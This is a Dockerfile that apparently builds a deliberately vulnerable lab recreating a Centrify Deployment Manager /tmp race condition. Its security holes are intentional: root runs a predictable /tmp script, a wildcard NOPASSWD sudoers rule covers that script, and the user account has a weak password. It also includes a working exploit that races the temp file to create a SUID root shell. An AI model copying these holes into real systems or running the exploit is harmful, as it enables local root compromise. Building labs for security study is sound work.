FROM debian:bookworm-slim

# Install required packages
RUN apt-get update && apt-get install -y \
    openssh-server \
    sudo \
    cron \
    bash \
    gcc \
    libc6-dev \
    inotify-tools \
    passwd \
    && rm -rf /var/lib/apt/lists/*

# Setup SSH
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo 'lowpriv:password123' | chpasswd

# Simulate the Centrify Deployment Manager vulnerability (OSVDB-88166)
# The real vulnerability: Centrify's deployment manager runs a script as root
# that writes commands to /tmp/centrify.cmd.0, chmod 755's it, then executes
# it via dzdo (Centrify's sudo equivalent) as root. A race condition allows
# a local user to pre-create the file and inject commands before execution.

# Create a simulated "dzdo" binary (Centrify's sudo equivalent) - just a wrapper around sudo
RUN printf '%s\n' \
    '#!/bin/bash' \
    '# dzdo - Centrify sudo equivalent (simulated)' \
    'exec sudo "$@"' > /usr/local/bin/dzdo && \
    chmod 755 /usr/local/bin/dzdo

# Create the vulnerable centrify deployment manager simulator script
# This mimics the exact behavior described in the exploit:
# 1. Writes commands to /tmp/centrify.cmd.0 using echo/append
# 2. chmod 755 the file
# 3. Executes it as root via dzdo
# 4. Removes it
# The vulnerability: it does NOT check if the file already exists or is owned by root
RUN cat <<'VULN_SCRIPT' > /usr/local/bin/centrify-deploy-mgr
#!/bin/bash
# Simulated Centrify Deployment Manager v2.1.0.283
# Vulnerable: writes to predictable /tmp/centrify.cmd.0 without safe checks

CMDFILE="/tmp/centrify.cmd.0"
UUID1=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee")
UUID2=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "ffffffff-1111-2222-3333-444444444444")

# Vulnerable: uses > which truncates but if file exists and is owned by attacker,
# attacker can still write to it between our writes and the execution
echo "echo ${UUID1}" > "${CMDFILE}"
echo "vmware -v 2> /dev/null |grep 'VMware ESX Server' >/dev/null" >> "${CMDFILE}"
echo 'temp=$?' >> "${CMDFILE}"
echo "echo ${UUID2}" >> "${CMDFILE}"
echo 'exit ${temp}' >> "${CMDFILE}"

# Make executable
chmod 755 "${CMDFILE}"

# Small delay simulating network latency (makes race easier to win)
sleep 0.2

# Execute as root (the real vulnerability - dzdo runs it as root)
/bin/bash "${CMDFILE}"

# Cleanup
rm -rf "${CMDFILE}"
VULN_SCRIPT

RUN chmod 755 /usr/local/bin/centrify-deploy-mgr && \
    chown root:root /usr/local/bin/centrify-deploy-mgr

# Configure sudo to allow the centrify-deploy-mgr to run the cmd file as root
# This simulates dzdo's NOPASSWD root execution capability
# The cron job simulates the periodic "Analyze/Refresh Computer Information" action
RUN echo "root * * * * /usr/local/bin/centrify-deploy-mgr >> /var/log/centrify-deploy.log 2>&1" > /etc/cron.d/centrify-deploy && \
    chmod 644 /etc/cron.d/centrify-deploy

# Also create a sudoers entry so the deployment manager service runs commands as root
# This simulates the dzdo privilege - the centrify-deploy-mgr runs as root
RUN echo "ALL ALL=(root) NOPASSWD: /bin/bash /tmp/centrify.cmd.*" >> /etc/sudoers.d/centrify && \
    chmod 440 /etc/sudoers.d/centrify

# Create a service script that runs the vulnerable deployment manager periodically (every 30 seconds)
RUN cat <<'SERVICE_SCRIPT' > /usr/local/bin/centrify-service
#!/bin/bash
# Simulates periodic Centrify Deployment Manager refresh
while true; do
    /usr/local/bin/centrify-deploy-mgr >> /var/log/centrify-deploy.log 2>&1
    sleep 30
done
SERVICE_SCRIPT
RUN chmod 755 /usr/local/bin/centrify-service

# Create the exploit script for the lowpriv user
RUN cat <<'EXPLOIT_EOF' > /home/lowpriv/exploit.sh
#!/bin/bash
# Exploit for Centrify Deployment Manager v2.1.0.283 (OSVDB-88166)
# Race condition: pre-create /tmp/centrify.cmd.0 so we own it,
# then continuously append our malicious command.
# When the deployment manager runs, it will execute our command as root.

CMDFILE="/tmp/centrify.cmd.0"
TARGET="/etc/shadow"

echo "[*] Centrify Deployment Manager v2.1.0.283 Local Privilege Escalation"
echo "[*] OSVDB-88166 - Race condition in /tmp/centrify.cmd.0"
echo ""

# Method 1: Symlink attack - make centrify.cmd.0 point to /etc/shadow
# This will cause the chmod 755 to change permissions on /etc/shadow
echo "[*] Setting up symlink attack..."
rm -f "${CMDFILE}" 2>/dev/null

# Pre-create the file so we own it
touch "${CMDFILE}"
echo "[+] Pre-created ${CMDFILE} (owned by us)"

# Now continuously write our payload into the file
# The race: between chmod 755 and execution, we inject our command
echo "[*] Starting race condition exploit loop..."
echo "[*] Waiting for centrify-deploy-mgr to run (runs every 30 seconds)..."

# Run the injection loop in background
(while true; do
    echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> "${CMDFILE}" 2>/dev/null
done) &
RACE_PID=$!

# Wait for the service to execute our payload
for i in $(seq 1 60); do
    if [ -f /tmp/rootbash ] && [ -u /tmp/rootbash ]; then
        kill $RACE_PID 2>/dev/null
        echo "[+] SUCCESS! SUID root shell created at /tmp/rootbash"
        echo "[+] Run: /tmp/rootbash -p"
        /tmp/rootbash -p -c "id"
        exit 0
    fi
    sleep 1
done

kill $RACE_PID 2>/dev/null
echo "[-] Exploit timed out. Try running again."
exit 1
EXPLOIT_EOF

RUN chown lowpriv:lowpriv /home/lowpriv/exploit.sh && \
    chmod +x /home/lowpriv/exploit.sh

# Create startup script that runs both sshd and the vulnerable centrify service
RUN cat <<'START_SCRIPT' > /usr/local/bin/start.sh
#!/bin/bash
# Start the vulnerable centrify deployment manager service in background
/usr/local/bin/centrify-service &
# Start SSH in foreground
exec /usr/sbin/sshd -D
START_SCRIPT
RUN chmod 755 /usr/local/bin/start.sh

# Verify vulnerability is in place
RUN ls -la /usr/local/bin/centrify-deploy-mgr && \
    ls -la /usr/local/bin/centrify-service && \
    cat /etc/sudoers.d/centrify && \
    echo "Centrify Deployment Manager vulnerability configured"

# Verify /tmp is world-writable (required for the race condition)
RUN test -d /tmp && ls -ld /tmp

EXPOSE 22
CMD ["/usr/local/bin/start.sh"]